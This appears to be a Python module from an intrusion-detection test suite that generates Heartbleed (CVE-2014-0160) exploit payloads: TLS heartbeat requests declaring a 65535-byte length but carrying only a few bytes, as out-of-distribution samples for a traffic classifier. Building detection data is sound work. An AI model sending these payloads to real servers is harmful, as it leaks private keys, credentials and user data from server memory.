"""Heartbleed (CVE-2014-0160) payload generator.

Protocol fingerprint:
  - TLS record layer header with content type 24 (heartbeat)
  - Heartbeat message with declared payload_length of 65535
    but actual payload far smaller — the core of CVE-2014-0160
  - TLS 1.2/1.1 record version bytes

Why not in 44-class training set:
  The training set contains benign TLS 1.3 ClientHello/ServerHello
  and encrypted application data (type 23), but does NOT include
  TLS heartbeat (type 24) records — and especially not ones with
  an intentionally mismatched payload_length field of 65535 that
  triggers the server to over-read memory.
"""

import os
import random
import struct

from . import register_attack

# TLS record content types
TLS_CHANGE_CIPHER_SPEC = 20
TLS_ALERT = 21
TLS_HANDSHAKE = 22
TLS_APPLICATION_DATA = 23
TLS_HEARTBEAT = 24

# TLS versions
TLS_1_0 = 0x0301
TLS_1_1 = 0x0302
TLS_1_2 = 0x0303

# Heartbeat message types
HEARTBEAT_REQUEST = 1
HEARTBEAT_RESPONSE = 2


def _build_tls_record(content_type: int, version: int, payload: bytes) -> bytes:
    """Build a TLS record layer frame.

    Format: 1-byte content_type | 2-byte version | 2-byte length | payload
    """
    return struct.pack(">BHH", content_type, version, len(payload)) + payload


def _build_heartbeat(msg_type: int, payload: bytes, declared_len: int) -> bytes:
    """Build a TLS heartbeat message.

    Format: 1-byte type | 2-byte payload_length | payload | padding
    """
    return struct.pack(">BH", msg_type, declared_len) + payload


@register_attack("heartbleed")
def generate_heartbleed(count: int = 1) -> list[bytes]:
    """Generate Heartbleed exploit payload(s).

    Each payload is a TLS heartbeat request where the declared
    payload_length is 65535 (max uint16) but the actual data is
    tiny — this is the heartbleed bug trigger.

    The server will read up to 65535 bytes from its memory starting
    at the payload position and echo them back, leaking secrets.

    Returns:
        List of bytes payloads, each 200-500 bytes.
    """
    payloads = []
    for i in range(count):
        parts = []

        # Always include a ClientHello prefix for TLS context
        ch_random = os.urandom(32)
        extensions_data = os.urandom(random.randint(80, 150))
        cipher_suites_data = os.urandom(random.randint(20, 60))
        client_hello = (
            b"\x01"  # ClientHello msg type
            + b"\x00\x00\x30"  # length placeholder
            + struct.pack(">H", TLS_1_2)  # client version
            + ch_random
            + struct.pack(">B", len(extensions_data) % 256)  # session_id len
            + extensions_data[: (len(extensions_data) % 256)]
            + cipher_suites_data
            + b"\x01\x00"  # compression methods (null)
        )
        parts.append(_build_tls_record(TLS_HANDSHAKE, TLS_1_2, client_hello))

        # Add several heartbeat requests with the heartbleed signature:
        # declared payload_length = 65535, actual payload tiny.
        num_heartbeats = 3
        for hb_idx in range(num_heartbeats):
            actual_payload = b"HEARTBLEED" + bytes([hb_idx])
            declared_length = 65535

            heartbeat_msg = _build_heartbeat(
                HEARTBEAT_REQUEST, actual_payload, declared_length
            )
            parts.append(
                _build_tls_record(TLS_HEARTBEAT, TLS_1_2, heartbeat_msg)
            )

        payloads.append(b"".join(parts))

    return payloads
